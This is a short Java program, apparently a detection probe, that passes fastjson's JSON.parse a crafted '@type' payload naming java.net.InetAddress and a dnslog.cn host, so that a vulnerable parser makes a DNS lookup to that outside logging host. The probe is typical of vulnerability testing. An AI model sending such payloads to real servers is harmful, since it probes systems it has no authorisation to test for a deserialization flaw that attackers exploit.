package detect;
import com.alibaba.fastjson.JSON;
import  java.net.InetAddress;
public class Dnslog {
    public static void main(String[] args) {
        String payload = "{\"@type\":\"java.net.InetAddress\", \"val\":\"in817q.dnslog.cn\"}";
        JSON.parse(payload);
    }
}
